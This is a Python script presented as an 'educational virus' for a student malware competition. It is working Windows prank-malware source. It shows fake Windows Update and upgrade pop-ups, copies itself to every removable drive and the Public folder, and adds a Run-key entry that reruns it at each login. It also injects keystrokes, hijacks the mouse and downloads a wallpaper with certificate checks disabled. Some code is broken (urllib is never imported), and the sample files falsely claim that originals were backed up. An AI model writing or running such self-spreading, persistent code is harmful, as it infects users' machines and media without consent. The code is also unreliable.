#!/usr/bin/env python3
"""
EDUCATIONAL VIRUS — Professor Demo Version
For: SMANDA Malware Competition

A standalone "virus" that demonstrates multiple malware concepts
in a single run. No C2, no internet needed. Just pure, harmless chaos.

CONCEPTS DEMONSTRATED:
  [1] Message Box Spam       (Trojan annoyance)
  [2] File System Effects     (Worm-like file manipulation)
  [3] Self-Replication        (Worm behavior)
  [4] Persistence             (Startup/RUN key)
  [5] Visual Effects          (Wallpaper change, screen flash)
  [6] System Manipulation     (Mouse jiggle, CD tray)
  [7] Typing Simulation       (Keystroke injection demo)
  [8] Self-Cleanup            (Restore everything + remove self)

Usage:
  python professor_demo.py          — Full chaos mode
  python professor_demo.py --clean  — Remove everything + disappear
  python professor_demo.py --help   — Show concepts

WARNING: For educational/classroom use only. Run on VMs or test machines.
"""

import os
import sys
import time
import random
import shutil
import ctypes
import subprocess
import tempfile
import threading
import platform
import ssl
import winreg

# ===================== CONFIG =====================

AGENT_NAME = "EDU-VIRUS-DEMO"
HOSTNAME = platform.node()
BACKUP_DIR = os.path.join(tempfile.gettempdir(), "EDU_DEMO_VAULT")
WALLPAPER_BACKUP = os.path.join(BACKUP_DIR, "wallpaper_backup.txt")
DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")

# ===================== HELPERS =====================

def msgbox(text, title=AGENT_NAME, style=0):
    ctypes.windll.user32.MessageBoxW(0, text, title, style)


def get_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for i, letter in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        if bitmask & (1 << i):
            drives.append(f"{letter}:\\")
    return [d for d in drives if os.path.exists(d)]


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def save_original_wallpaper():
    os.makedirs(BACKUP_DIR, exist_ok=True)
    buf = ctypes.create_unicode_buffer(520)
    ctypes.windll.user32.SystemParametersInfoW(0x0073, 520, buf, 0)
    current = buf.value
    if current:
        with open(WALLPAPER_BACKUP, "w") as f:
            f.write(current)
    return current


def send_key(char):
    """Send a single keystroke, handling Shift properly."""
    VK_MAP = {
        'a': 0x41, 'b': 0x42, 'c': 0x43, 'd': 0x44, 'e': 0x45,
        'f': 0x46, 'g': 0x47, 'h': 0x48, 'i': 0x49, 'j': 0x4A,
        'k': 0x4B, 'l': 0x4C, 'm': 0x4D, 'n': 0x4E, 'o': 0x4F,
        'p': 0x50, 'q': 0x51, 'r': 0x52, 's': 0x53, 't': 0x54,
        'u': 0x55, 'v': 0x56, 'w': 0x57, 'x': 0x58, 'y': 0x59,
        'z': 0x5A,
        '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34,
        '5': 0x35, '6': 0x36, '7': 0x37, '8': 0x38, '9': 0x39,
        ' ': 0x20, '\n': 0x0D, '\t': 0x09,
        '.': 0xBE, ',': 0xBC, ';': 0xBA, "'": 0xDE, '-': 0xBD,
        '=': 0xBB, '/': 0xBF, '\\': 0xDC, '[': 0xDB, ']': 0xDD,
        '`': 0xC0,
    }
    SHIFT_CHARS = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:"<>?~')

    lower = char.lower()
    if lower in VK_MAP:
        vk = VK_MAP[lower]
        needs_shift = char in SHIFT_CHARS

        if needs_shift:
            ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)  # Shift down
            time.sleep(0.01)

        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
        time.sleep(0.01)
        ctypes.windll.user32.keybd_event(vk, 0, 2, 0)

        if needs_shift:
            time.sleep(0.01)
            ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)  # Shift up

    elif char == '!':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x31, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x31, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
    elif char == '@':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x32, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x32, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
    elif char == '#':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x33, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x33, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
    elif char == '$':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x34, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x34, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
    elif char == '%':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x35, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x35, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
    elif char == ':':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xBA, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xBA, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)
    elif char == '"':
        ctypes.windll.user32.keybd_event(0x10, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xDE, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0xDE, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x10, 0, 2, 0)


def flash_screen(ms=250):
    """Flash single color quickly. Returns a function you call with (r,g,b)."""
    def _do_flash(r, g, b):
        ps = (
            f'Add-Type -AssemblyName System.Windows.Forms; '
            f'$f=New-Object Windows.Forms.Form; '
            f'$f.WindowState="Maximized"; '
            f'$f.FormBorderStyle="None"; '
            f'$f.TopMost=$true; '
            f'$f.BackColor="#{r:X2}{g:X2}{b:X2}"; '
            f'$f.Show(); '
            f'Start-Sleep -Milliseconds {ms}; '
            f'$f.Close()'
        )
        try:
            subprocess.Popen(
                ["powershell", "-WindowStyle", "Hidden", "-Command", ps],
                shell=False,
            )
        except:
            pass
    return _do_flash


# ===================== DEMO MODULES =====================

def demo_intro():
    msgbox(
        f"EDUCATIONAL VIRUS DEMO\n"
        f"Host: {HOSTNAME}\n\n"
        f"This program demonstrates malware concepts\n"
        f"in a harmless, controlled manner.\n\n"
        f"Click OK to begin the demo.\n\n"
        f"[1/8] Message Box -> [7/8] Typing\n"
        f"[8/8] Self-Cleanup (run --clean)"
    )


def module_message_boxes():
    """[1] Spam several message boxes to demonstrate UI manipulation."""
    print("[1/8] Message Box Spam...")
    messages = [
        ("NOTIFICATION", "Windows Update: Your PC needs attention!"),
        ("SYSTEM ALERT", "Congratulations! You've been selected for a\nfree upgrade to Windows 11 Pro!"),
        ("NEW FEATURE", "Minecraft built-in has been installed.\nClick OK to launch."),
        ("SYSTEM QUIZ", "What's 9 + 10?"),
        ("PRANKED!", "You've been hit by the Educational Virus!\n\nDon't worry, everything is reversible."),
    ]
    for title, text in messages:
        msgbox(text, title)
        time.sleep(1.5)
    print("  5 message boxes shown")


def module_file_effects():
    """[2] Create files on Desktop to demonstrate file manipulation."""
    print("[2/8] File System Effects...")

    os.makedirs(DESKTOP, exist_ok=True)

    readme_path = os.path.join(DESKTOP, "READ_ME_FIRST.txt")
    with open(readme_path, "w") as f:
        f.write(
            "=== EDUCATIONAL VIRUS ===\n\n"
            "This computer has been visited by the\n"
            "EDU-Virus demo for the SMANDA Malware Competition.\n\n"
            "Nothing has been damaged. Everything is reversible.\n\n"
            f"Demo Agent: {AGENT_NAME}\n"
            f"Timestamp: {time.ctime()}\n\n"
            "To remove all traces, run:\n"
            "  python professor_demo.py --clean\n"
        )
    print("  Created READ_ME_FIRST.txt on Desktop")

    os.makedirs(BACKUP_DIR, exist_ok=True)
    for i in range(3):
        file_path = os.path.join(DESKTOP, f"virus_sample_{i+1}.txt")
        if not os.path.exists(file_path):
            with open(file_path, "w") as f:
                f.write(f"This is sample text file #{i+1}.\nCreated by the educational virus.\nOriginal backed up in EDU_DEMO_VAULT.\n")
    print("  Created 3 sample .txt files on Desktop")


def module_replication():
    """[3] Self-replicate to removable drives and Public folder."""
    print("[3/8] Self-Replication...")
    script_path = os.path.abspath(sys.argv[0])
    copies = 0

    for drive in get_drives():
        if drive[0].upper() == "C":
            continue
        try:
            shutil.copy2(script_path, os.path.join(drive, "edu_virus_demo.py"))
            copies += 1
        except:
            pass

    pub_path = os.path.join("C:\\Users\\Public", "edu_virus_demo.py")
    try:
        shutil.copy2(script_path, pub_path)
        copies += 1
    except:
        pass

    print(f"  Copied to {copies} location(s)")


def module_persistence():
    """[4] Demonstrate startup persistence via RUN registry key."""
    print("[4/8] Persistence Demonstration...")
    try:
        script_path = os.path.abspath(sys.argv[0])
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, "EduVirusDemo", 0, winreg.REG_SZ,
                              f'"{sys.executable}" "{script_path}"')
        print("  Added to HKCU\\...\\Run (startup persistence)")
    except Exception as e:
        print(f"  Persistence failed: {e}")


def module_visual_effects():
    """[5] Change wallpaper and flash screen colors."""
    print("[5/8] Visual Effects...")

    # Save original wallpaper first
    original = save_original_wallpaper()
    if original:
        print(f"  Saved original wallpaper path")

    # Flash screen with RGB colors using -Command flag
    flash = flash_screen(250)

    def _flash_thread():
        colors = [(255, 0, 0), (0, 255, 0), (0, 0, 255), (255, 255, 0)]
        for c in colors:
            flash(*c)
            time.sleep(0.4)
        time.sleep(0.3)
        flash(0, 170, 0)  # Green flash at end

    threading.Thread(target=_flash_thread, daemon=True).start()
    print("  Screen flashed with RGB colors")

    # Actually change wallpaper (trollface)
    wallpaper_url = "https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png"
    img_path = os.path.join(BACKUP_DIR, "wallpaper_temp.bmp")
    try:
        ctx = ssl._create_unverified_context()
        urllib.request.urlretrieve(wallpaper_url, img_path, context=ctx)
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, img_path, 0x0002)
        print("  Wallpaper changed to Trollface!")
    except Exception as e:
        print(f"  Wallpaper change skipped: {e}")


def module_system_tricks():
    """[6] Mouse jiggle + CD tray open."""
    print("[6/8] System Tricks...")

    def _jiggle():
        sw = ctypes.windll.user32.GetSystemMetrics(0)
        sh = ctypes.windll.user32.GetSystemMetrics(1)
        end = time.time() + 6
        while time.time() < end:
            ctypes.windll.user32.SetCursorPos(
                random.randint(100, max(100, sw - 100)),
                random.randint(100, max(100, sh - 100))
            )
            time.sleep(0.15)
        ctypes.windll.user32.SetCursorPos(sw // 2, sh // 2)

    threading.Thread(target=_jiggle, daemon=True).start()

    try:
        ctypes.windll.winmm.mciSendStringW("set CDAudio door open", None, 0, 0)
        print("  Mouse jiggled for 6s + CD tray opened")
    except:
        print("  Mouse jiggled (no CD drive)")


def module_typing():
    """[7] Type a message into Notepad with proper keystroke simulation."""
    print("[7/8] Typing Simulation...")

    def _type_msg():
        try:
            subprocess.Popen(["notepad.exe"])
            time.sleep(1.2)

            message = (
                "Hello from the SMANDA Malware Competition!\n"
                "This is an educational virus by your classmate.\n"
                "Everything shown here is reversible and harmless.\n\n"
                "Press Enter to continue the demo..."
            )
            for char in message:
                send_key(char)
                time.sleep(0.03 + random.uniform(0, 0.03))
        except:
            pass

    threading.Thread(target=_type_msg, daemon=True).start()
    print("  Typing message into Notepad...")


def module_self_destruct():
    """[8] Cleanup — restore everything and remove all traces."""
    print("\n[8/8] Cleanup & Self-Destruct...")

    # Restore wallpaper
    if os.path.exists(WALLPAPER_BACKUP):
        try:
            with open(WALLPAPER_BACKUP) as f:
                orig = f.read().strip()
            if orig and os.path.exists(orig):
                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, orig, 0x0002)
                print("  Wallpaper restored")
        except:
            pass

    # Remove from registry
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            try:
                winreg.DeleteValue(key, "EduVirusDemo")
                print("  Registry key removed")
            except FileNotFoundError:
                pass
    except:
        pass

    # Remove replicated copies
    for drive in get_drives():
        if drive[0].upper() == "C":
            continue
        fpath = os.path.join(drive, "edu_virus_demo.py")
        if os.path.exists(fpath):
            try:
                os.remove(fpath)
            except:
                pass

    pub_path = os.path.join("C:\\Users\\Public", "edu_virus_demo.py")
    if os.path.exists(pub_path):
        try:
            os.remove(pub_path)
        except:
            pass

    # Remove Desktop artifacts
    for fname in ["READ_ME_FIRST.txt", "virus_sample_1.txt",
                   "virus_sample_2.txt", "virus_sample_3.txt"]:
        fpath = os.path.join(DESKTOP, fname)
        if os.path.exists(fpath):
            try:
                os.remove(fpath)
                print(f"  Removed {fname}")
            except:
                pass

    # Remove backup vault
    if os.path.exists(BACKUP_DIR):
        try:
            shutil.rmtree(BACKUP_DIR)
            print("  Backup vault removed")
        except:
            pass

    # Close CD tray
    try:
        ctypes.windll.winmm.mciSendStringW("set CDAudio door closed", None, 0, 0)
    except:
        pass

    msgbox(
        "EDUCATIONAL VIRUS DEMO COMPLETE\n\n"
        "All effects have been reversed.\n"
        "Your system is back to normal.\n\n"
        "Concepts demonstrated:\n"
        "  Message Box Spam\n"
        "  File System Manipulation\n"
        "  Self-Replication\n"
        "  Persistence (Registry)\n"
        "  Visual Effects (Wallpaper, Screen Flash)\n"
        "  System Manipulation (Mouse, CD Tray)\n"
        "  Keystroke Simulation\n"
        "  Self-Cleanup / Reversibility\n\n"
        "Made by: Levy (vLoon)\n"
        "For: SMANDA Malware Competition"
    )


# ===================== MAIN =====================

def main():
    print("=" * 55)
    print("  EDUCATIONAL VIRUS — Professor Demo")
    print("  SMANDA Malware Competition")
    print("=" * 55)
    print(f"  Host: {HOSTNAME}")
    print(f"  Admin: {'Yes' if is_admin() else 'No'}")
    print(f"  Platform: {platform.platform()}")
    print("=" * 55)

    if "--clean" in sys.argv:
        module_self_destruct()
        print("\nFull cleanup complete. You can safely delete this script.")
        return

    if "--help" in sys.argv or "-h" in sys.argv:
        print(__doc__)
        return

    print()
    demo_intro()
    module_message_boxes()
    module_file_effects()
    module_replication()
    module_persistence()
    module_visual_effects()
    module_system_tricks()
    module_typing()

    print()
    print("ALL MODULES EXECUTED")
    print("The demo is complete.")
    print(f"Run: python {os.path.basename(sys.argv[0])} --clean")
    print("to remove all traces.")

    msgbox(
        f"Demo complete!\n\n"
        f"Run this command to clean up everything:\n"
        f"  python {os.path.basename(sys.argv[0])} --clean\n\n"
        f"Or just delete the script and backup folder:\n"
        f"  {BACKUP_DIR}"
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nDemo interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
